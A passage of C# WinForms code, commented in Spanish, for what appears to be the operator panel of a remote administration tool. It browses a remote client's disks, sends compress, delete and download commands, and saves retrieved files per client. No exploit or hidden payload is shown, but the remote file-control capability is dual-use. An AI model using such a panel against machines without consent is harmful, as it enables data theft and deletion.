                    ShowNotification("Archivo", $"Archivo: {archivo.Nombre}\nTamaño: {archivo.Tamaño}\nRuta: {archivo.Ruta}", ToolTipIcon.Info);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error navegando a archivo: {ex.Message}");
                ShowNotification("Error", $"Error navegando: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void ComprimirElemento(FileSystemEntry archivo)
        {
            try
            {
                Console.WriteLine($"🗜️ Iniciando compresión de: {archivo.Ruta}");
                
                // Mostrar progreso inicial
                ShowCompressionProgress("Iniciando compresión...", 0, Color.Orange);
                
                // Buscar el formulario principal para enviar el comando
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    Console.WriteLine($"✅ Enviando comando COMPRIMIR:{archivo.Ruta}");
                    
                    // Enviar comando Comprimir al cliente
                    _ = Task.Run(async () =>
                    {
                        await form1.SendComprimirCommand(clientId, archivo.Ruta);
                    });
                    
                    ShowNotification("Compresión Iniciada", $"Comprimiendo: {archivo.Nombre}\nRuta: {archivo.Ruta}", ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"❌ No se pudo encontrar el formulario principal");
                    ShowCompressionProgress("Error: No se pudo enviar comando", 0, Color.Red);
                    ShowNotification("Error", "No se pudo encontrar el formulario principal", ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error iniciando compresión: {ex.Message}");
                ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                ShowNotification("Error", $"Error iniciando compresión: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void BorrarElemento(FileSystemEntry archivo)
        {
            try
            {
                Console.WriteLine($"🗑️ Iniciando borrado de: {archivo.Ruta}");
                
                // Mostrar progreso inicial
                ShowCompressionProgress("🔄 Iniciando borrado...", 0, Color.Orange);
                
                // Buscar el formulario principal para enviar el comando
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    Console.WriteLine($"✅ Enviando comando BORRAR:{archivo.Ruta}");
                    
                    // Enviar comando Borrar al cliente
                    _ = Task.Run(async () =>
                    {
                        await form1.SendBorrarCommand(clientId, archivo.Ruta);
                    });
                    
                    ShowNotification("Borrado Iniciado", $"Borrando: {archivo.Nombre}\nRuta: {archivo.Ruta}", ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"❌ No se pudo encontrar el formulario principal");
                    ShowCompressionProgress("❌ Error: No se pudo enviar comando", 0, Color.Red);
                    ShowNotification("Error", "No se pudo encontrar el formulario principal", ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error iniciando borrado: {ex.Message}");
                ShowCompressionProgress($"❌ Error: {ex.Message}", 0, Color.Red);
                ShowNotification("Error", $"Error iniciando borrado: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void ActualizarVistaActual()
        {
            try
            {
                Console.WriteLine($"🔄 Actualizando vista actual: {rutaActual}");
                
                // Mostrar progreso inicial
                ShowCompressionProgress("🔄 Actualizando vista...", 0, Color.Orange);
                
                // Buscar el formulario principal para enviar el comando
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    Console.WriteLine($"✅ Enviando comando ABRIRDISCO:{rutaActual}");
                    
                    // Enviar comando ABRIRDISCO con la ruta actual
                    _ = Task.Run(async () =>
                    {
                        await form1.SendAbrirDiscoCommand(clientId, rutaActual);
                    });
                    
                    ShowNotification("Actualización Iniciada", $"Actualizando vista: {rutaActual}", ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"❌ No se pudo encontrar el formulario principal");
                    ShowCompressionProgress("❌ Error: No se pudo enviar comando", 0, Color.Red);
                    ShowNotification("Error", "No se pudo encontrar el formulario principal", ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error actualizando vista: {ex.Message}");
                ShowCompressionProgress($"❌ Error: {ex.Message}", 0, Color.Red);
                ShowNotification("Error", $"Error actualizando vista: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private void DescargarElemento(FileSystemEntry archivo)
        {
            try
            {
                // Verificar que NO sea una carpeta
                if (archivo.Tipo == "CARPETA")
                {
                    ShowNotification("Error", "No se puede descargar una carpeta. Solo archivos.", ToolTipIcon.Warning);
                    return;
                }

                // Verificar tamaño del archivo (convertir a bytes)
                long tamanoBytes = ConvertTamanioToBytes(archivo.Tamaño);
                if (tamanoBytes > 20 * 1024 * 1024) // 20MB
                {
                    ShowNotification("Error", $"El archivo es muy grande ({archivo.Tamaño}). Máximo permitido: 20MB", ToolTipIcon.Warning);
                    return;
                }

                Console.WriteLine($"📥 Iniciando descarga de: {archivo.Ruta} (Tamaño: {archivo.Tamaño})");
                
                // Mostrar progreso inicial
                ShowCompressionProgress("📥 Iniciando descarga...", 0, Color.Orange);
                
                // Buscar el formulario principal para enviar el comando
                Form mainForm = Application.OpenForms.OfType<Form>().FirstOrDefault(f => f is Form1);
                if (mainForm != null && mainForm is Form1 form1)
                {
                    Console.WriteLine($"✅ Enviando comando DESCARGAR:{archivo.Ruta}");
                    
                    // Enviar comando Descargar al cliente
                    _ = Task.Run(async () =>
                    {
                        await form1.SendDescargarCommand(clientId, archivo.Ruta);
                    });
                    
                    ShowNotification("Descarga Iniciada", $"Descargando: {archivo.Nombre}\nRuta: {archivo.Ruta}", ToolTipIcon.Info);
                }
                else
                {
                    Console.WriteLine($"❌ No se pudo encontrar el formulario principal");
                    ShowCompressionProgress("❌ Error: No se pudo enviar comando", 0, Color.Red);
                    ShowNotification("Error", "No se pudo encontrar el formulario principal", ToolTipIcon.Error);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error iniciando descarga: {ex.Message}");
                ShowCompressionProgress($"❌ Error: {ex.Message}", 0, Color.Red);
                ShowNotification("Error", $"Error iniciando descarga: {ex.Message}", ToolTipIcon.Error);
            }
        }

        private long ConvertTamanioToBytes(string tamanio)
        {
            try
            {
                // Remover espacios y convertir a minúsculas
                string cleanTamanio = tamanio.Trim().ToLower();
                
                if (cleanTamanio.EndsWith("kb"))
                {
                    double kb = double.Parse(cleanTamanio.Replace("kb", ""));
                    return (long)(kb * 1024);
                }
                else if (cleanTamanio.EndsWith("mb"))
                {
                    double mb = double.Parse(cleanTamanio.Replace("mb", ""));
                    return (long)(mb * 1024 * 1024);
                }
                else if (cleanTamanio.EndsWith("gb"))
                {
                    double gb = double.Parse(cleanTamanio.Replace("gb", ""));
                    return (long)(gb * 1024 * 1024 * 1024);
                }
                else if (cleanTamanio.EndsWith("b"))
                {
                    return long.Parse(cleanTamanio.Replace("b", ""));
                }
                else
                {
                    // Intentar parsear como bytes
                    return long.Parse(cleanTamanio);
                }
            }
            catch
            {
                return 0; // Si no se puede parsear, asumir 0 bytes
            }
        }

        private void ShowCompressionProgress(string message, int progress, Color color)
        {
            try
            {
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        ShowCompressionProgress(message, progress, color);
                    });
                    return;
                }

                // Buscar el ProgressBar en el formulario
                var progressBar = this.Controls.Find("progressBarEstadoDeCompresionArchivoOCarpera", true).FirstOrDefault() as ProgressBar;
                if (progressBar != null)
                {
                    progressBar.Value = progress;
                    progressBar.ForeColor = color;
                    
                    // Buscar el Label de estado si existe
                    var labelEstado = this.Controls.Find("labelEstadoCompresion", true).FirstOrDefault() as Label;
                    if (labelEstado != null)
                    {
                        labelEstado.Text = message;
                        labelEstado.ForeColor = color;
                    }
                    
                    Console.WriteLine($"Progreso de compresión: {progress}% - {message}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error mostrando progreso de compresión: {ex.Message}");
            }
        }

        // Método público para procesar respuesta de compresión
        public void ProcessCompressionResponse(string compressionResponse)
        {
            try
            {
                Console.WriteLine($"🎯 Procesando respuesta de compresión: {compressionResponse}");
                
                // Procesar la respuesta usando la misma lógica de compresión
                string processedResponse = CompressionResponseProcessor.ProcesarRespuestaCompresion(compressionResponse);
                
                if (!processedResponse.StartsWith("ERROR:"))
                {
                    // Parsear la respuesta
                    CompressionResult result = CompressionResponseProcessor.ParsearRespuestaCompresion(processedResponse);
                    
                    Console.WriteLine($"Respuesta de compresión procesada: Estado={result.Estado}, Mensaje={result.Mensaje}");
                    
                    // Actualizar la UI según el resultado
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            UpdateCompressionUI(result);
                        });
                    }
                    else
                    {
                        UpdateCompressionUI(result);
                    }
                }
                else
                {
                    Console.WriteLine($"Error procesando respuesta de compresión: {processedResponse}");
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            ShowCompressionProgress($"Error: {processedResponse}", 0, Color.Red);
                        });
                    }
                    else
                    {
                        ShowCompressionProgress($"Error: {processedResponse}", 0, Color.Red);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando respuesta de compresión: {ex.Message}");
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                    });
                }
                else
                {
                    ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                }
            }
        }

        // Método público para procesar respuesta de borrado
        public void ProcessDeleteResponse(string deleteResponse)
        {
            try
            {
                Console.WriteLine($"🗑️ Procesando respuesta de borrado: {deleteResponse}");
                
                // Procesar la respuesta usando la lógica de borrado
                string processedResponse = DeleteResponseProcessor.ProcesarRespuestaBorrado(deleteResponse);
                
                if (!processedResponse.StartsWith("ERROR:"))
                {
                    // Parsear la respuesta
                    DeleteResult result = DeleteResponseProcessor.ParsearRespuestaBorrado(processedResponse);
                    
                    Console.WriteLine($"Respuesta de borrado procesada: Estado={result.Estado}, Mensaje={result.Mensaje}");
                    
                    // Actualizar la UI según el resultado
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            UpdateDeleteUI(result);
                        });
                    }
                    else
                    {
                        UpdateDeleteUI(result);
                    }
                }
                else
                {
                    Console.WriteLine($"Error procesando respuesta de borrado: {processedResponse}");
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            ShowCompressionProgress($"Error: {processedResponse}", 0, Color.Red);
                        });
                    }
                    else
                    {
                        ShowCompressionProgress($"Error: {processedResponse}", 0, Color.Red);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando respuesta de borrado: {ex.Message}");
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                    });
                }
                else
                {
                    ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                }
            }
        }

        // Método público para procesar respuesta de descarga
        public void ProcessDownloadResponse(string downloadResponse)
        {
            try
            {
                Console.WriteLine($"📥 Procesando respuesta de descarga: {downloadResponse}");
                
                // Procesar la respuesta usando la lógica de descarga
                string processedResponse = DownloadResponseProcessor.ProcesarRespuestaDescarga(downloadResponse);
                
                if (!processedResponse.StartsWith("ERROR:"))
                {
                    // Parsear la respuesta
                    DownloadResult result = DownloadResponseProcessor.ParsearRespuestaDescarga(processedResponse);
                    
                    Console.WriteLine($"Respuesta de descarga procesada: Estado={result.Estado}, Mensaje={result.Mensaje}");
                    
                    // Actualizar la UI según el resultado
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            UpdateDownloadUI(result);
                        });
                    }
                    else
                    {
                        UpdateDownloadUI(result);
                    }
                }
                else
                {
                    Console.WriteLine($"Error procesando respuesta de descarga: {processedResponse}");
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            ShowCompressionProgress($"Error: {processedResponse}", 0, Color.Red);
                        });
                    }
                    else
                    {
                        ShowCompressionProgress($"Error: {processedResponse}", 0, Color.Red);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando respuesta de descarga: {ex.Message}");
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                    });
                }
                else
                {
                    ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
                }
            }
        }

        private void UpdateCompressionUI(CompressionResult result)
        {
            try
            {
                Color progressColor;
                int progressValue;
                string message;

                switch (result.Estado.ToLower())
                {
                    case "completado":
                        progressColor = Color.Green; // Verde para completado
                        progressValue = 100;
                        message = $"✅ Compresión completada: {result.Mensaje}";
                        if (result.TamañoOriginal > 0 && result.TamañoComprimido > 0)
                        {
                            double ratio = (double)result.TamañoComprimido / result.TamañoOriginal * 100;
                            message += $"\n📊 Tamaño: {FormatBytes(result.TamañoOriginal)} → {FormatBytes(result.TamañoComprimido)} ({ratio:F1}%)";
                        }
                        ShowNotification("Compresión Exitosa", result.Mensaje, ToolTipIcon.Info);
                        break;
                    
                    case "fallido":
                        progressColor = Color.Red;
                        progressValue = 0;
                        message = $"❌ Compresión fallida: {result.Mensaje}";
                        
                        // Mensajes más específicos según el error
                        if (result.Mensaje.Contains("está siendo utilizado"))
                        {
                            message = "❌ Archivo en uso: El archivo está siendo utilizado por otro proceso";
                        }
                        else if (result.Mensaje.Contains("no existe"))
                        {
                            message = "❌ Archivo no encontrado: El archivo o carpeta no existe";
                        }
                        else if (result.Mensaje.Contains("acceso denegado"))
                        {
                            message = "❌ Acceso denegado: No tienes permisos para acceder al archivo";
                        }
                        
                        ShowNotification("Compresión Fallida", result.Mensaje, ToolTipIcon.Error);
                        break;
                    
                    case "progreso":
                        progressColor = Color.Orange;
                        progressValue = result.Progreso;
                        message = $"🔄 Comprimiendo... {result.Progreso}% - {result.Mensaje}";
                        break;
                    
                    default:
                        progressColor = Color.Orange;
                        progressValue = 50;
                        message = result.Mensaje;
                        break;
                }

                ShowCompressionProgress(message, progressValue, progressColor);
                Console.WriteLine($"UI de compresión actualizada: {result.Estado} - {result.Mensaje}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando UI de compresión: {ex.Message}");
                ShowCompressionProgress($"Error actualizando UI: {ex.Message}", 0, Color.Red);
            }
        }

        private string FormatBytes(long bytes)
        {
            string[] suffixes = { "B", "KB", "MB", "GB", "TB" };
            int counter = 0;
            decimal number = bytes;
            while (Math.Round(number / 1024) >= 1)
            {
                number /= 1024;
                counter++;
            }
            return $"{number:n1} {suffixes[counter]}";
        }

        // Método público para actualizar los discos con datos reales del cliente
        public void UpdateDisksFromClient(string diskInfoString)
        {
            try
            {
                Console.WriteLine($"Actualizando discos para cliente {clientId} con datos: {diskInfoString.Length} caracteres");
                
                // Procesar la información de discos recibida del cliente
                string processedInfo = DiskInfoProcessor.ProcesarDatosDiscosRecibidos(diskInfoString);
                
                if (!processedInfo.StartsWith("ERROR:"))
                {
                    // Parsear la información de discos
                    discosCliente = DiskInfoProcessor.ParsearInformacionDiscos(processedInfo);
                    
                    Console.WriteLine($"Discos parseados: {discosCliente.Length} discos encontrados");
                    
                    // Actualizar la UI de forma segura
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            UpdateDisksUI();
                        });
                    }
                    else
                    {
                        UpdateDisksUI();
                    }
                    
                    Console.WriteLine($"Discos actualizados para cliente {clientId}: {discosCliente.Length} discos");
                }
                else
                {
                    Console.WriteLine($"Error procesando información de discos: {processedInfo}");
                    if (this.InvokeRequired)
                    {
                        this.Invoke((MethodInvoker)delegate
                        {
                            ShowErrorMessage($"Error procesando discos: {processedInfo}");
                        });
                    }
                    else
                    {
                        ShowErrorMessage($"Error procesando discos: {processedInfo}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando discos: {ex.Message}");
                if (this.InvokeRequired)
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        ShowErrorMessage($"Error actualizando discos: {ex.Message}");
                    });
                }
                else
                {
                    ShowErrorMessage($"Error actualizando discos: {ex.Message}");
                }
            }
        }

        private void UpdateDisksUI()
        {
            try
            {
                Console.WriteLine($"Actualizando UI con {discosCliente.Length} discos");
                
                // Suspender el layout para evitar redibujos innecesarios
                PanelDiscosCliente.SuspendLayout();
                
                try
                {
                    // Limpiar panel de forma segura
                    if (PanelDiscosCliente.InvokeRequired)
                    {
                        PanelDiscosCliente.Invoke((MethodInvoker)delegate
                        {
                            PanelDiscosCliente.Controls.Clear();
                        });
                    }
                    else
                    {
                        PanelDiscosCliente.Controls.Clear();
                    }
                    
                    if (discosCliente.Length > 0)
                    {
                        // Crear lista de cards antes de agregarlas
                        List<CardDiscos> cardsToAdd = new List<CardDiscos>();
                        
                        foreach (DiskInfo disco in discosCliente)
                        {
                            Console.WriteLine($"Creando card para disco: {disco.LetraUnidad}");
                            CardDiscos cardDisco = CreateDiskCard(disco);
                            if (cardDisco != null)
                            {
                                cardsToAdd.Add(cardDisco);
                            }
                        }
                        
                        // Agregar todas las cards de una vez
                        if (PanelDiscosCliente.InvokeRequired)
                        {
                            PanelDiscosCliente.Invoke((MethodInvoker)delegate
                            {
                                foreach (CardDiscos card in cardsToAdd)
                                {
                                    PanelDiscosCliente.Controls.Add(card);
                                    Console.WriteLine($"Card agregada al panel: {card.Name}");
                                }
                            });
                        }
                        else
                        {
                            foreach (CardDiscos card in cardsToAdd)
                            {
                                PanelDiscosCliente.Controls.Add(card);
                                Console.WriteLine($"Card agregada al panel: {card.Name}");
                            }
                        }
                        
                        Console.WriteLine($"UI actualizada exitosamente con {cardsToAdd.Count} cards");
                        
                        // Configurar scroll según cantidad de cards
                        ConfigureScrollForCards();
                        
                        // Forzar scroll al final si hay muchas cards
                        if (cardsToAdd.Count > 3)
                        {
                            PanelDiscosCliente.VerticalScroll.Value = PanelDiscosCliente.VerticalScroll.Maximum;
                            PanelDiscosCliente.PerformLayout();
                        }
                    }
                    else
                    {
                        ShowErrorMessage("No se encontraron discos en el cliente");
                    }
                }
                finally
                {
                    // Reanudar el layout y forzar el refresco
                    PanelDiscosCliente.ResumeLayout();
                    PanelDiscosCliente.Refresh();
                    PanelDiscosCliente.Update();
                    
                    // Verificar el estado de las cards después de un pequeño delay
                    System.Threading.Timer timer = null;
                    timer = new System.Threading.Timer((state) =>
                    {
                        if (this.InvokeRequired)
                        {
                            this.Invoke((MethodInvoker)delegate
                            {
                                VerifyCardsState();
                                timer?.Dispose();
                            });
                        }
                        else
                        {
                            VerifyCardsState();
                            timer?.Dispose();
                        }
                    }, null, 100, System.Threading.Timeout.Infinite);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando UI: {ex.Message}");
                ShowErrorMessage($"Error actualizando UI: {ex.Message}");
            }
        }

        private CardDiscos CreateDiskCard(DiskInfo disco)
        {
            try
            {
                CardDiscos cardDisco = new CardDiscos();
                cardDisco.DestectarDiscosClentesID(disco.LetraUnidad, $"{disco.TamanoTotal}/{disco.EspacioLibre}", disco.TipoParticion);
                
                // Configurar propiedades del control para asegurar persistencia
                cardDisco.Name = $"CardDisco_{disco.LetraUnidad.Replace(":", "")}";
                cardDisco.Tag = disco; // Guardar referencia al objeto disco
                cardDisco.Visible = true;
                cardDisco.Enabled = true;
                cardDisco.Size = new Size(270, 80); // Tamaño optimizado para lista vertical
                cardDisco.Dock = DockStyle.None; // Asegurar que no use Dock
                cardDisco.Anchor = AnchorStyles.Top | AnchorStyles.Left; // Anclar en la esquina superior izquierda
                
                // Agregar evento de clic usando el nuevo evento público
                cardDisco.CardClicked += (sender, e) => 
                {
                    Console.WriteLine($"🎯 EVENTO CARD CLICKED - Disco: {e.LetraUnidad}");
                    OpenDiskExplorer(e);
                };
                
                // Agregar evento para verificar visibilidad
                cardDisco.VisibleChanged += (sender, e) =>
                {
                    Console.WriteLine($"Card {cardDisco.Name} visibilidad cambiada a: {cardDisco.Visible}");
                };
                
                Console.WriteLine($"Card creada para disco {disco.LetraUnidad}: {cardDisco.Name}");
                return cardDisco;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creando card para disco {disco.LetraUnidad}: {ex.Message}");
                return null;
            }
        }


        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        private void UpdateDeleteUI(DeleteResult result)
        {
            try
            {
                Color progressColor;
                int progressValue;
                string message;

                switch (result.Estado.ToLower())
                {
                    case "completado":
                        progressColor = Color.Green; // Verde para completado
                        progressValue = 100;
                        message = $"✅ Borrado completado: {result.Mensaje}";
                        if (!result.ExisteDespues)
                        {
                            message += "\n🔍 Verificación: Elemento eliminado correctamente";
                        }
                        ShowNotification("Borrado Exitoso", result.Mensaje, ToolTipIcon.Info);
                        break;
                    
                    case "fallido":
                        progressColor = Color.Red;
                        progressValue = 0;
                        message = $"❌ Borrado fallido: {result.Mensaje}";
                        
                        // Mensajes más específicos según el error
                        if (result.Mensaje.Contains("no existe"))
                        {
                            message = "❌ Elemento no existe: El archivo o carpeta no existe";
                        }
                        else if (result.Mensaje.Contains("está siendo utilizado"))
                        {
                            message = "❌ Elemento en uso: El archivo está siendo utilizado por otro proceso";
                        }
                        else if (result.Mensaje.Contains("pero aún existe"))
                        {
                            message = "❌ Verificación fallida: Elemento eliminado pero aún existe";
                        }
                        
                        ShowNotification("Borrado Fallido", result.Mensaje, ToolTipIcon.Error);
                        break;
                    
                    default:
                        progressColor = Color.Orange;
                        progressValue = 50;
                        message = $"⚠️ Estado desconocido: {result.Mensaje}";
                        break;
                }

                ShowCompressionProgress(message, progressValue, progressColor);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando UI de borrado: {ex.Message}");
                ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
            }
        }

        private void UpdateDownloadUI(DownloadResult result)
        {
            try
            {
                Color progressColor;
                int progressValue;
                string message;

                switch (result.Estado.ToLower())
                {
                    case "completado":
                        progressColor = Color.Green; // Verde para completado
                        progressValue = 100;
                        message = $"✅ Descarga completada: {result.Mensaje}";
                        
                        // Guardar el archivo en disco
                        if (result.DatosArchivo != null && result.DatosArchivo.Length > 0)
                        {
                            string rutaGuardado = GuardarArchivoDescargado(result.Extension, result.DatosArchivo);
                            if (!string.IsNullOrEmpty(rutaGuardado))
                            {
                                message += $"\n💾 Guardado en: {rutaGuardado}";
                                ShowNotification("Descarga Exitosa", $"Archivo guardado en: {rutaGuardado}", ToolTipIcon.Info);
                            }
                            else
                            {
                                message += "\n❌ Error guardando archivo";
                                ShowNotification("Error de Guardado", "No se pudo guardar el archivo", ToolTipIcon.Error);
                            }
                        }
                        break;
                    
                    case "fallido":
                        progressColor = Color.Red;
                        progressValue = 0;
                        message = $"❌ Descarga fallida: {result.Mensaje}";
                        
                        // Mensajes más específicos según el error
                        if (result.Mensaje.Contains("no existe"))
                        {
                            message = "❌ Archivo no encontrado: El archivo no existe en el cliente";
                        }
                        else if (result.Mensaje.Contains("muy grande"))
                        {
                            message = "❌ Archivo muy grande: El archivo supera el límite de 20MB";
                        }
                        else if (result.Mensaje.Contains("acceso denegado"))
                        {
                            message = "❌ Acceso denegado: No tienes permisos para acceder al archivo";
                        }
                        
                        ShowNotification("Descarga Fallida", result.Mensaje, ToolTipIcon.Error);
                        break;
                    
                    default:
                        progressColor = Color.Orange;
                        progressValue = 50;
                        message = $"⚠️ Estado desconocido: {result.Mensaje}";
                        break;
                }

                ShowCompressionProgress(message, progressValue, progressColor);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error actualizando UI de descarga: {ex.Message}");
                ShowCompressionProgress($"Error: {ex.Message}", 0, Color.Red);
            }
        }

        private string GuardarArchivoDescargado(string extension, byte[] datosArchivo)
        {
            try
            {
                // Crear carpeta para el cliente si no existe
                string carpetaCliente = Path.Combine(Application.StartupPath, "Descargas", clientId);
                if (!Directory.Exists(carpetaCliente))
                {
                    Directory.CreateDirectory(carpetaCliente);
                    Console.WriteLine($"📁 Carpeta creada: {carpetaCliente}");
                }
                
                // Generar nombre único para el archivo
                string nombreArchivo = $"archivo_{DateTime.Now:yyyyMMdd_HHmmss}_{Guid.NewGuid().ToString().Substring(0, 8)}.{extension}";
                string rutaCompleta = Path.Combine(carpetaCliente, nombreArchivo);
                
                // Guardar el archivo
                File.WriteAllBytes(rutaCompleta, datosArchivo);
                
                Console.WriteLine($"💾 Archivo guardado: {rutaCompleta} ({datosArchivo.Length} bytes)");
                return rutaCompleta;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error guardando archivo: {ex.Message}");
                return null;
            }
        }
    }
}
